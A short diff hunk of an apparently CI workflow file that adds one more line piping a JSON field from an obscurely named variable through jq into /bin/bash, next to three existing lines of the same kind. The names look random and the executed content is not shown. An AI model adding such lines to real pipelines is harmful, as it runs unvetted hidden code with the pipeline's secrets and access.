@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$u41846" | jq -r .nwlyb3308 | /bin/bash
           printf '%s' "$yw18009" | jq -r .g088 | /bin/bash
           echo $ec5 | jq -r .hqx11 | /bin/bash
+          printf '%s' "$wy110" | jq -r .lnsni4 | /bin/bash
 
       - name: Upload artifact
         if: always()
